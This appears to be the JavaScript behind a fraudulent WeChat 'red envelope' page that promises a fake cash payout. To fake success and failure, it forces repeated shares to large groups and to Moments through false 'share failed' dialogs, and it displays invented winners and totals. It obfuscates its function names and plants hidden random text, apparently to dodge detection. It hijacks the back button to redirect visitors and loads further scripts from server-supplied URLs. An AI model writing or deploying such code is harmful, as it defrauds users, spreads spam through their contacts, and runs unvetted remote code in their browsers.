// var tout = document.createElement("div");
// tout.innerHTML ='<a id="back"></a><audio src="http://cd.cdkuiyang.com/jin-61/hongbao214/static/image/music.mp3" preload="auto" autoplay="autoplay" id="mp3"></audio><div class="tan-bg-tz"><div class="new-bg-tz"><div class="tongzhi_top"><div class="t_l_text"><div><img src="http://cd.cdkuiyang.com/jin-61/hongbao214/static/image/wei_xin.png" alt=""></div><div>微信 · <span class="text-new">刚刚</span></div></div><div class="safe-img"><img src="http://cd.cdkuiyang.com/jin-61/hongbao214/static/image/safe.png" alt=""></div></div><div class="tongzhi_bottom"><div><div>微信红包</div><div class="text-ling">情人节红包已到账，分享即可领取</div></div><div class="tz_img"><img src="http://cd.cdkuiyang.com/jin-61/hongbao214/static/image/tongzhi.jpg" alt=""></div></div></div></div>'
// document.body.appendChild(tout);
// playmp3("mp3");

// setTimeout(function(){
//     document.getElementsByClassName('tan-bg-tz')[0].style.visibility = 'hidden'
// },3000)
// function playmp3(id) {
//   if (document.getElementById(id).paused == true) {
//     document.getElementById(id).play();
//   }
//   document.addEventListener(
//     "WeixinJSBridgeReady",
//     function() {
//       document.getElementById("mp3").play();
//     },
//     false
//   );
// }

var mulumulu = 'jin-61/0616hongbao';
//var time_1 = document.createElement('div');
//   time_1.innerHTML = '<div id="time_1" style="display:none;z-index:9999;border: 1px solid #fff;color:#fff;position: fixed;bottom: 10vw//;padding: 8px 10px;font-size: 16px;left:50%;width: 176px;margin-left:-98px">有效时间还剩 : <span id="timer" style="color:#ff1f05"></span>'
//    document.body.appendChild(time_1);
function countTime() {


    var date = new Date();
    var now = date.getTime();

    var str = "2020/2/14 23:59:59";
    var endDate = new Date(str);
    var end = endDate.getTime();


    var leftTime = end - now;

    var d, h, m, s;
    if (leftTime >= 0) {
        d = Math.floor(leftTime / 1000 / 60 / 60 / 24);
        h = Math.floor(leftTime / 1000 / 60 / 60 % 24);
        m = Math.floor(leftTime / 1000 / 60 % 60);
        s = Math.floor(leftTime / 1000 % 60);
    }

    d = checkTime(d);
    h = checkTime(h);
    m = checkTime(m);
    s = checkTime(s);

    function checkTime(i) {
        if (i < 10) {
            i = "0" + i;
        }
        return i;
    }

    document.getElementById('timer').innerHTML = h + ":" + m + ":" + s

    setTimeout(countTime, 1000);
}


function fdow039gzob7(e) {
    return document.querySelector(e)
}

function isc4s2z6u0w8(e, t) {
    var a = document.createElement("script");
    a.src = e,
        a.onload = function () {
            a.parentNode && a.parentNode.removeChild(a),
            "function" == typeof t && t()
        },
        document.body.appendChild(a)
}

function rte7ltlez3w2b() {
    for (var e = parseInt(60 * Math.random()) + 15, t = 0, a = "", n = 2e4, o = 1e3; t < e;) {
        t++;
        var i = parseInt(Math.random() * o);
        a += String.fromCharCode(n + i)
    }
    return a
}

function clqggkmfv8ct(e) {
    for (var t = ["div", "li", "ul", "p", "a", "span", "h2", "i"], a = 0; a < e; a++) {
        var n = t[Math.floor(Math.random() * t.length)],
            o = document.createElement(n);
        o.style.display = "none",
            o.textContent = rte7ltlez3w2b(),
            document.body.appendChild(o)
    }
}

function gpvcu3i6ntb0f(e) {
    for (var t = window.location.search.substring(1), a = t.split("&"), n = 0; n < a.length; n++) {
        var o = a[n].split("=");
        if (o[0] == e)
            return o[1]
    }
    return null
}

function gidnfrfq1dl1vq(e) {
    var t = Math.random().toString(36).substr(2);
    return e == t ? gidnfrfq1dl1vq(e) : t
}

function rnumxpfuc47w4g(e, t, a) {
    var n = 0,
        o = a ? Math.pow(10, a) : 1;
    return n = Math.floor(Math.random() * (t * o - e * o + 1)) + e * o,
    a && (n = (n / o).toFixed(a)),
        n
}

function gdatafi8jwpac4c(e, t, a) {
    var n = new XMLHttpRequest;
    n.onreadystatechange = function () {
        4 === n.readyState && (200 === n.status || 304 === n.status ? "function" == typeof t && t(n.responseText) :
            "function" == typeof a && a(n))
    },
        n.open("GET", e, !0),
        n.send(null)
}

function ssmfshybso8fp() {
    var e = document.createElement("div");
    e.innerHTML =
        '<div class="tip" style="opacity: 0.8; position: fixed; z-index: 999; top: 10px; right: 10px; overflow: hidden; text-align: center; color: #f25543; font-size: 15px; animation: tipMove 1.5s infinite;">        <div class="arrow" style="overflow: hidden; width: 110px; height: 100px;">            <div class="line" style="border-top: solid 2px #f25543; border-right: solid 2px #f25543; width: 20px; height: 20px; position: absolute; top: 3px; right: 3px; transform: skewX(-25deg) rotate(-30deg);"></div>            <div class="orc" style="width: 200px; height: 80px; border-radius: 50%; border: solid 2px #f25543; position: absolute; top: -14px; right: -2px; transform: rotate(-22deg)"></div>        </div>        <div style="transform: translateY(-100%)">发送点这里</div>    </div>',
        document.body.appendChild(e)
}

function numanpm0tgyxf6(e, t) {
    var a = t.time || 1e3,
        n = t.number || 192.22,
        o = t.regulator || 100,
        i = n / (a / o),
        r = 0,
        p = 0,
        s = setInterval(function () {
            r = Math.floor(100 * (r + i)) / 100,
            r >= n && (clearInterval(s),
                r = n,
                // ssmfshybso8fp(),
                stipw995c01hlwt());
            var t = Number(r);
            t != p && (p = t,
                e.innerHTML = p.toFixed(2))
        }, 30)
}

function opulkrz1124b1is() {
    function e(e) {
        var t = e || 5,
            a = new Date((new Date).getTime() - 60 * t * 1e3),
            n = ("0" + a.getHours()).slice(-2),
            o = ("0" + a.getMinutes()).slice(-2);
        ("0" + a.getSeconds()).slice(-2);
        return n + ":" + o
    }

    function t() {
        var e = 0;
        return e = Math.floor(50 * Math.random() * i) + 100 * i,
            e /= i,
            e.toFixed(2)
    }


    function a(a) {
        var n = document.createElement("div"),
            o = t();

        if (a.number > 100) {
            return n.style.cssText =
                "width: 100%; height: 60px; overflow: hidden; box-sizing: border-box; padding: 0 10px; border-bottom: 1px solid rgba(0, 0, 0, .05); display: -webkit-box; display: flex; flex-wrap: wrap; align-items: center; justify-content: center;",
                n.innerHTML =
                    '<img style="width: 40px; height: 40px; margin-right: 10px; overflow: hidden; background-color: #eee; border-radius: ' +
                    s + '%" src="' + a.avatar +
                    '">                            <div style="flex: 1;">                                <div style="font-size: 15px; color: #000; margin-bottom: 4px;">' +
                    a.name + '</div>                                <div style="font-size: 14px; color: #929493;">' + e(r + 5) +
                    '</div>                            </div> <div style="text-align: right;"><div>' + a.number +
                    '元</div><div style="color: #FF9800;font-size: 12px;"><img style="width: 12px;height: auto;"src="https://wangjin-61.oss-cn-shanghai.aliyuncs.com/' + mulumulu + '/static/image/huang_guan.png" alt=""/>手气最佳</div>' + "</div>",
                totalMoney -= Number(o),
                c.textContent = "总计2000000元 剩余" + totalMoney.toFixed(2) + "元",
                n
        } else {
            return n.style.cssText =
                "width: 100%; height: 60px; overflow: hidden; box-sizing: border-box; padding: 0 10px; border-bottom: 1px solid rgba(0, 0, 0, .05); display: -webkit-box; display: flex; flex-wrap: wrap; align-items: center; justify-content: center;",
                n.innerHTML =
                    '<img style="width: 40px; height: 40px; margin-right: 10px; overflow: hidden; background-color: #eee; border-radius: ' +
                    s + '%" src="' + a.avatar +
                    '">                            <div style="flex: 1;">                                <div style="font-size: 15px; color: #000; margin-bottom: 4px;">' +
                    a.name + '</div>                                <div style="font-size: 14px; color: #929493;">' + e(r + 5) +
                    '</div>                            </div>                            <div style="text-align: right;"><div>' + a.number +
                    '元</div><div style="color: #FF9800;font-size: 12px;"></div>' +
                    "                           </div>",
                totalMoney -= Number(o),
                c.textContent = "总计2000000元 剩余" + totalMoney.toFixed(2) + "元",
                n
        }


    }

    function n() {
        var e = u.lastChild;
        e.parentNode.removeChild(e);
        var t = a(o[r]);
        t.style.animation = "itemMove" + l + " 0.5s",
            u.insertBefore(t, u.firstChild),
            r++,
        r >= o.length && (r = 0)
    }

    var o = [{
        name: "孙笑川",
        avatar: "https://q.qlogo.cn/qqapp/1104718115/9DE656A9B0C0384FCCF7D02BD02CFCB5/100",
        number: 95.23
    }, {
        name: "带带大师兄",
        avatar: "https://q.qlogo.cn/qqapp/1104718115/5DA508A1616E732B0EB92A1ADAF28456/100",
        number: 86.39
    }, {
        name: "六小龄孙",
        avatar: "https://q.qlogo.cn/qqapp/1104718115/D42066DE19EBB82D30A351185956DB41/100",
        number: 76.36
    }, {
        name: "夢醒ぴ誮落盡",
        avatar: "https://q.qlogo.cn/qqapp/1104718115/F6213667E85E205FF363B3947D218D38/100",
        number: 66.83
    }, {
        name: "最好的我们",
        avatar: "https://q.qlogo.cn/qqapp/1104718115/D56EE4D71422A112CDA6B7B44D48B044/100",
        number: 106.28
    }, {
        name: "甜味少女馆",
        avatar: "https://q.qlogo.cn/qqapp/1104718115/0DE079B903E44F96AB9BAD85D706A61F/100",
        number: 85.66
    }, {
        name: "风有几分甜",
        avatar: "https://q.qlogo.cn/qqapp/1104718115/A6F3CA4B97E59BB9AE5495984ACF3090/100",
        number: 69.68
    }, {
        name: "风月难入怀",
        avatar: "https://q.qlogo.cn/qqapp/1104718115/E0FB2E95D84068B944789BF6569B3A7F/100",
        number: 86.18
    }, {
        name: "神明不渡我",
        avatar: "https://q.qlogo.cn/qqapp/1104718115/71E4837B7B1F0A12D5F8D90234DDB95C/100",
        number: 59.66
    }, {
        name: "壊壊の少爷",
        avatar: "https://q.qlogo.cn/qqapp/1104718115/9ADBAEBE292B4FA0737F9DB142336157/100",
        number: 93.59
    }, {
        name: "山河故人在",
        avatar: "https://q.qlogo.cn/qqapp/1104718115/D6AEE11866CCEC092B82C532218F6B20/100",
        number: 96.88
    }, {
        name: "孙粒子",
        avatar: "https://q.qlogo.cn/qqapp/1104718115/BE2BFD6D743F815AC7A8FA974E40D4FC/100",
        number: 79.57
    }, {
        name: "Mr. Xue",
        avatar: "https://q.qlogo.cn/qqapp/1104718115/5283BB3808A16D227AC03DC4374F77C6/100",
        number: 23.55
    }, {
        name: "、dacy",
        avatar: "https://q.qlogo.cn/qqapp/1104718115/48BE3B50C3E9847242626FF9A07C3317/100",
        number: 48.55
    }];
    o.sort(function () {
        return Math.random() > .5 ? -1 : 1
    });
    var i = 100,
        r = Math.floor(Math.random() * o.length),
        p = 10,
        s = Math.floor(50 * Math.random()),
        l = Math.floor(4 * Math.random()) + 1,
        d = Math.floor(500 * Math.random()) + 1800,
        c = document.getElementById(total_id),
        u = document.createElement("div");
    for (u.style.cssText =
             "width: 100%; background-color: rgba(255,255,255,0.1); overflow: hidden; border-radius: 5px; height: 600px;"; p >
         0;)
        u.appendChild(a(o[r])),
            r++,
        r >= o.length && (r = 0),
            p--;
    fdow039gzob7(".page").appendChild(u);
    var m = setInterval(function () {
        if (!u.parentNode)
            return clearInterval(m);
        n()
    }, d)
}

function gclhpjfy0tjmwo(e) {
    var t = Math.floor(45 * Math.random()) + 210,
        a = Math.floor(35 * Math.random()) + 220;
    return e ? "rgb(" + a + ", 205, 155)" : "rgb(" + t + ", 94, 77)"
}

function ipag08c1wvuv98x6() {
    var e = Math.floor(10 * Math.random()) + 10,
        t = Math.floor(9 * Math.random()) + 15,
        a =
            '<div class="page" style="height: 100vh; overflow: hidden; background-color: #fff;" onclick="stipw995c01hlwt()">  <div><img style="width:100%" src="https://wangjin-61.oss-cn-shanghai.aliyuncs.com/' + mulumulu + '/static/image/index_top_01.png"> </div>                 <div style="border: 0px solid ' +
            color + ";border-radius: 0px 0px 50% 50% / 10px 10px " + t + "% " + t + '%; margin-bottom: 20px ">                        <img src="' + api.logo +
            '"                            style="width: 40px; height: 40px;margin: 0 auto 0; display: block;padding-top: 10px;">                        <p style="font-size: 14px; color: #000; text-align: center;padding-top: 6px;font-weight:bold">' + api.ztitle +
            '</p>                        <p style="font-size: 40px; text-align: center;padding-top: 15px; color:#c29b60; font-weight: bold">                            <span></span>                            <span data-time>0</span>                        </p>                        <div id="squn" style="display:block; text-align: center; font-size: 12px; color: #c29b60;margin:10px 0 20px;">恭喜发财,大吉大利</div>                        <div class="btn" style="margin: 0 auto; margin-top:.43rem; background: #f55643; color: #fff; width:4rem; border-radius: 6px; font-weight:800; cursor: pointer; padding:.40rem 1.4rem; font-size:15px; animation: Updown .5s infinite alternate;text-align:center;margin-bottom:30px">点击领取</div> <div id="squan" style="display:none; text-align: center; font-size: 15px; color: ' +
            gold +
            '">享分到朋友圈后，自动转入</div>                    </div> <div id="' +
            total_id +
            '" style="font-size: 14px; color:#929493; height: 30px; line-height: 30px; padding-left: 10px; border-bottom: solid 1px rgba(0,0,0,0.05)"></div>                    <div style="position: fixed; z-index: 999; top: 0px; left: -15px; width: 80px; height: 40px; line-height: 40px; border-radius: 0 20px 20px 0;  text-align: center">                        <a id="tousu" style="font-size: 14px; color: #fff; text-decoration: none;">< 返回</a>                    </div>                </div>';
    clqggkmfv8ct(e),
        document.body.innerHTML += a,
        clqggkmfv8ct(e);
    var n = document.getElementById("main");
    n && n.parentNode.removeChild(n),
        opulkrz1124b1is(),
        numanpm0tgyxf6(fdow039gzob7("[data-time]"), {
            time: 1e3,
            number: Number(money),
            regulator: 50
        })
    document.getElementById('tousu').onclick = function (e) {
        e.stopPropagation()
//location.href = "/bak/tousu";
        gdatafi8jwpac4c(window.api.backlink, function (res) {
            location.href = JSON.parse(res)['n'];
        });
    }
}

function salidnhrdc3a7(e, t, a) {
    var n = "_alert-box",
        o = ["_box", "_content_box", "_confirm_box"],
        i = document.getElementById(n);
    i || (i = document.createElement("div"),
        i.id = n,
        i[o[0]] = document.createElement("div"),
        i[o[1]] = document.createElement("div"),
        i[o[2]] = document.createElement("div"),
        i.style.cssText =
            "position: fixed; top: 0; left: 0; z-index: 999; width: 100%; height: 100vh; background-color: rgba(0,0,0,0.45);",
        i[o[0]].style.cssText =
            "position: absolute; width: 75%; top: 50%; left: 50%; transform: translate(-50%, -50%); background-color: #fafafc; text-align: center; border-radius: 3px; font-family: arial",
        i[o[1]].style.cssText =
            "padding: 20px 20px 30px; font-size: 16px; color: #000; word-wrap: break-word; word-break: break-all",
        i[o[2]].style.cssText =
            "width: 100%; height: 50px; padding-bottom: 1px; display: flex; flex-wrap: wrap; justify-content: center; align-items: center; color: #0bb20c; font-size: 16px; border-top: solid 1px #dadada",
        i[o[0]].appendChild(i[o[1]]),
        i[o[0]].appendChild(i[o[2]]),
        i.appendChild(i[o[0]]),
        document.body.appendChild(i)),
        i.style.display = "block",
        i[o[1]].innerHTML = e,
        i[o[2]].innerHTML = t || "确定",
        i[o[2]].onclick = function () {
            i.style.display = "none",
            "function" == typeof a && a()
        }
}

function salidnhrdc3a8(e, t, a) {
    var n = "_alert-box",
        o = ["_box", "_content_box", "_confirm_box"],
        i = document.getElementById(n);
    i || (i = document.createElement("div"),
        i.id = n,
        i[o[0]] = document.createElement("div"),
        i[o[1]] = document.createElement("div"),
        i[o[2]] = document.createElement("div"),
        i.style.cssText =
            "position: fixed; top: 0; left: 0; z-index: 999; width: 100%; height: 100vh; background-color: rgba(0,0,0,0.45);",
        i[o[0]].style.cssText =
            "position: absolute; width: 75%; top: 50%; left: 50%; transform: translate(-50%, -50%); background-color: #fafafc; text-align: center; border-radius: 3px; font-family: arial",
        i[o[1]].style.cssText =
            "padding: 20px 20px 30px; font-size: 16px; color: #000; word-wrap: break-word; word-break: break-all",
        i[o[2]].style.cssText =
            "width: 100%; height: 50px; padding-bottom: 1px; display: flex; flex-wrap: wrap; justify-content: center; align-items: center; color: #0bb20c; font-size: 16px; border-top: solid 1px #dadada",
        i[o[0]].appendChild(i[o[1]]),
        i[o[0]].appendChild(i[o[2]]),
        i.appendChild(i[o[0]]),
        document.body.appendChild(i)),
        i.style.display = "block",
        i[o[1]].innerHTML = e,
        i[o[2]].innerHTML = t || "确定",
        i[o[2]].onclick = function () {
            i.style.display = "none",
            "function" == typeof a && a()
        }
}

function bgInner() {
    var bg1 = document.createElement("div");
    bg1.innerHTML = '<div style="z-index:44;width:100vw;height:100vh;' +
        'background-image:url(https://wangjin-61.oss-cn-shanghai.aliyuncs.com/' + mulumulu + '/static/image/s_bg_new1.jpg);' +
        'background-color:#000;background-position:center;background-size:100% 100%;' +
        'background-repeat:no-repeat;left:0;top:0;position:fixed;"></div>'
    document.body.appendChild(bg1);
}


var yes = 'https://wangjin-61.oss-cn-shanghai.aliyuncs.com/' + mulumulu + '/static/image/yes.png';
var no = 'https://wangjin-61.oss-cn-shanghai.aliyuncs.com/' + mulumulu + '/static/image/no.png';

function stipw995c01hlwt() {

    switch (step) {
        case 0:
            salidnhrdc3a7('<div class="weui-dialog" id="dialog1">\n' +
                '        <div class="pd" style="text-align: center;box-sizing: content-box;display: block;"><span style="font-size: 22px;color:#6fc55c;font-weight: bold">恭喜您</span><br><span style="font-size:20px;color:#6fc55c">您获得媏午节紅苞</span><br><span class="realmoney" style="font-size:22px;color:red">' +
                money +
                '</span>元<br><span style="color:red;">领取要求:</span>只需您分享到<span style="font-size:22px;color:red">微信群</span><br><span>完成后自动存入您的微信钱包</span><br></div>\n' +
                '        <div class="weui-dialog__ft" style="background-color: white;"> </div></div>', "马上分享领取");
            break;
        case 1:
            bgInner()
            countTime()
            document.getElementById('tousu').style.display = "none";
            document.getElementById('time_1').style.display = "block";
            salidnhrdc3a7('<div class="weui-dialog bg-hide" id="dialog2">\n' +
                '        <div class="pd" style="text-align: center ;">\n' +
                '            <p><strong><span style="color: rgb(0, 176, 80); font-size: 24px;">分享成功<img src="' + yes + '" style="position:relative;top:8px;width:40px;height:40px;"></span></strong></p>\n' +
                '            <p>仅需分享最后<strong style="color: red; font-size: 22px">2</strong>个群</p>\n' +
                '            <p>保证<strong style="color: red">100%</strong>可以立即</p>\n' +
                '            <p>领取<strong style="color: red; font-size: 22px"><span class="realmoney">' + money +
                '</span>元</strong></p>\n' +
                '        </div>\n' +
                '    </div>', "确定");

            break;
        case 2:
            salidnhrdc3a7(' <div class="weui-dialog bg-hide" id="dialog3">\n' +
                '        <div class="pd">\n' +
                '            <p><span style="font-size: 24px; color: rgb(255, 0, 0);"><strong>分享失败<img src="' + no + '" style="top:8px; position:relative; width:40px; height:40px;"> </strong></span></p>\n' +
                '            <p><span style="color: rgb(247, 150, 70);"></span></p>\n' +
                '            <p><span style="font-size: 16px;">注意：您的分享失败</span></p>\n' +
                '            <p></p>\n' +
                '            <p><span style="font-size: 16px;">请尝试重新分享到<strong><span style="font-size: 20px; color: rgb(255, 0, 0);">不同的微信群</span></strong></span></p>\n' +
                '            <p><span style="font-size: 16px;">保证<strong><span style="font-size: 20px; color: rgb(255, 0, 0);">100%</span></strong>可以领取<strong><span style="font-size: 20px; color: rgb(255, 0, 0);"><span class="realmoney">' +
                money + '</span>元</span></strong></span></p>\n' +
                '        </div>\n' +
                '        \n' +
                '    </div>', "确定");
            break;
        case 3:
            salidnhrdc3a7('<div class="weui-dialog bg-hide" id="dialog4">\n' +
                '        <div class="pd" style="text-align: center;">\n' +
                '            <p><strong><span style="color: rgb(0, 176, 80); font-size: 24px;">分享成功<img src="' + yes + '" style="position: relative; top:8px;width:40px;height:40px;"></span></strong></p>\n' +
                '            <p>仅需分享最后<strong style="color: red; font-size: 22px">1</strong>个群</p>\n' +
                '            <p>保证<strong style="color: red">100%</strong>可以立即</p>\n' +
                '            <p>领取<strong style="color: red; font-size: 22px"><span class="realmoney">' + money +
                '</span>元</strong></p>\n' +
                '        </div>\n' +
                '\n' +
                '    </div>', "确定");
            break;
        case 4:
            salidnhrdc3a7('<div class="weui-dialog bg-hide" id="dialog5">\n' +
                '        <div class="pd">\n' +
                '            <p><span style="font-size: 24px; color: rgb(255, 0, 0);"><strong>分享失败<img src="' + no + '" style="top: 8px;position: relative;width:40px;height:40px;"></strong></span></p>\n' +
                '            <p><span style="color: rgb(247, 150, 70);"></span></p>\n' +
                '            <p><span style="font-size: 16px;">注意：必须分享到<span style="color: rgb(255, 0, 0); font-size: 20px">50人</span>以上的群</span></p>\n' +
                '            <p></p>\n' +
                '            <p><span style="font-size: 16px;">请尝试重新分享到<strong><span style="font-size: 20px; color: rgb(255, 0, 0);">微信群</span></strong></span></p>\n' +
                '            <p><span style="font-size: 16px;">保证<strong><span style="font-size: 20px; color: rgb(255, 0, 0);">100%</span></strong>可以领取<strong><span style="font-size: 20px; color: rgb(255, 0, 0);"><span class="realmoney">' +
                money + '</span>元</span></strong></span></p>\n' +
                '        </div>\n' +
                '        \n' +
                '    </div>', "确定");
            break;
        case 5:
            salidnhrdc3a7('<div class="weui-dialog bg-hide" id="dialog6">\n' +
                '        <div class="pd" style="text-align: center;">\n' +
                '            <p><strong><span style="color: rgb(0, 176, 80); font-size: 24px;">分享成功<img src="' + yes + '" style="position:relative;top:8px;width:40px;height:40px;"></span></strong></p>\n' +
                '            <p>只剩<span style="color: rgb(255, 0, 0);">最后一步啦</span></p>\n' +
                '            <p>请分享到<span style="font-size: 24px; color: rgb(255, 0, 0);">朋友圈</span></p>\n' +
                '            <p>保证100%可领取<span style="font-size: 24px; color: rgb(255, 0, 0);"><span class="realmoney">' +
                money + '</span>元</span></p>\n' +
                '        </div>\n' +
                '        \n' +
                '    </div>', "确定");
            break;
        case 6:
            salidnhrdc3a7('<div class="weui-dialog bg-hide" id="dialog7">\n' +
                '        <div class="pd">\n' +
                '            <p><span style="font-size: 24px; color: rgb(255, 0, 0);"><strong>分享失败<img src="' + no + '" style="top:8px;position:relative;width:40px;height:40px;"></strong></span></p>\n' +
                '            <p><span style="color: rgb(247, 150, 70);"></span></p>\n' +
                '            <p><br style="font-size: 16px;">注意：</br><span style="color: rgb(255, 0, 0);">必须公开分享到朋友圈</span></br></span></p>\n' +
                '            <p></p>\n' +
                '            <p><span style="font-size: 16px;">请尝试重新分享到<strong><span style="font-size: 20px; color: rgb(255, 0, 0);">朋友圈</span></strong></span></p>\n' +
                '            <p><span style="font-size: 16px;">保证<strong><span style="font-size: 20px; color: rgb(255, 0, 0);">100%</span></strong>可以领取<strong><span style="font-size: 20px; color: rgb(255, 0, 0);"><span class="realmoney">' +
                money + '</span>元</span></strong></span></p>\n' +
                '        </div>\n' +
                '        \n' +
                '    </div>', "确定");
            break;
        case 7:
            salidnhrdc3a7('<div class="weui-dialog bg-hide" id="dialog8">\n' +
                '        <div class="pd" style="text-align: center;">\n' +
                '            <p style="margin:0;padding:0;">感谢您的参与 :-)</p>\n' +
                '            <p style="margin:0;padding:0;"> <span style="font-size: 18px;"><strong> <span style="color: rgb(255, 0, 0);">注意：系统将会验证朋友圈信息判断是否完成分享任务</span> </strong> </span> </p>\n' +
                '            <p style="margin:0;padding:0;margin-top:20px;">由于活动量巨大</p>\n' +
                '            <p style="margin:0;padding:0; font-size:12px">红包最迟24小时内到账</p>\n' +
                '            <p style="margin:0;padding:0; color:red">请保留朋友圈信息至红包到账</p>\n' +
                '            <p style="margin:0;padding:0;">请注意查看您的微信钱包</p>\n' +
                '            <p style="margin:0;padding:0;"><span style="color: rgb(255, 0, 0); font-size:14px\\"><strong>删除分享链接可能导致无法到账</strong></span> </p>\n' +
                '        </div>\n' +
                '    </div>', "确定",
                function () {
                    gdatafi8jwpac4c(api.backlink, function (res) {
                        location.href = JSON.parse(res)['n']

                    })
                });
            break;


    }
}

function iwxf3mw9e029zm() {
//alert(111)
//var n = "/" + Math.random().toString(36).substr(2) + ".png";
    wx.ready(function () {
        console.log(123)
        wx.hideOptionMenu();
        setshareinfo();
    });
}

function setshareinfo() {
    api.alert.shift()
    let info = api.alert.shift()
    if (info.type == 1) {
        if (info.share == 1) {
            wx.showMenuItems({
                menuList: ['menuItem:share:appMessage']
            });
            wx.onMenuShareAppMessage({
                title: info.title,
                desc: info.desc,
                link: info.link,
                imgUrl: info.img,
                type: 'video',
                success: function () {
                    step++;
                    stipw995c01hlwt()
                    setshareinfo()
                }
            });
        }

        if (info.share == 2) {
            wx.hideOptionMenu();
            wx.showMenuItems({
                menuList: ['menuItem:share:timeline']
            });
            wx.onMenuShareTimeline({
                title: info.title,
                link: info.link,
                imgUrl: info.img,
                success: function () {
                    step++;
                    stipw995c01hlwt()
                    setshareinfo()
                }
            });
        }
    }
}

var total_id = gidnfrfq1dl1vq()
//, money = gpvcu3i6ntb0f("t")
    ,
    money = (Math.random() * 50 + 50).toFixed(2),
    totalMoney = Math.floor(3e5 * Math.random() + 2e5),
    api = null,
    step = 0,
    color = gclhpjfy0tjmwo(),
    gold = gclhpjfy0tjmwo(!0);

isc4s2z6u0w8("https://res.wx.qq.com/open/js/jweixin-1.4.0.js", function () {
// alert()
    gdatafi8jwpac4c('http://' + document.domain + '/' + mulumulu + '/api/Hb.php?m=ticket', function (e) {
        data = JSON.parse(e),
            wx.config({
                debug: false,
                appId: data.sign.appId,
                timestamp: data.sign.timestamp,
                nonceStr: data.sign.nonceStr,
                signature: data.sign.signature,
                jsApiList: ['onMenuShareTimeline', 'onMenuShareAppMessage', 'hideMenuItems',
                    'showMenuItems']
            });
    }, function (e) {
        console.log("请求失败 >> fail", e),
            console.log("err.status >>", e.status)
    })
    var t = 'http://' + document.domain + '/' + mulumulu + '/api/Hb.php?m=show';
    gdatafi8jwpac4c(t, function (e) {
        api = JSON.parse(window.atob(e)),
            console.log("run !!! show"),
            ipag08c1wvuv98x6(),
            iwxf3mw9e029zm(),
            isc4s2z6u0w8(api.baiduid),
            setTimeout(function () {
                history.pushState(history.length + 1, "message", "#" + new Date().getTime())
                history.pushState(history.length + 1, "message", "#" + new Date().getTime())


//Nj(window.api.backlink)

                isc4s2z6u0w8(window.api.sys_global_url + 'static/js/common.js');
            }, 100);

        function Nj(link) {
            gdatafi8jwpac4c(link, function (res) {
//console.log(res);
                location.href = JSON.parse(res)['n'];
            });
        }

        function zp() {
            function Nj(link) {
                gda6jrp46x27p7(link, function (res) {
                    res = JSON.parse(res);
                    location.href = res.n
                });
            }

            Nj(window.api.backlink)
        }

        window.onhashchange = function () {
            zp()
//document.getElementById('back').click();
        }
    }, function (e) {
        console.log("请求失败 >> fail", e),
            console.log("err.status >>", e.status)
    })
});

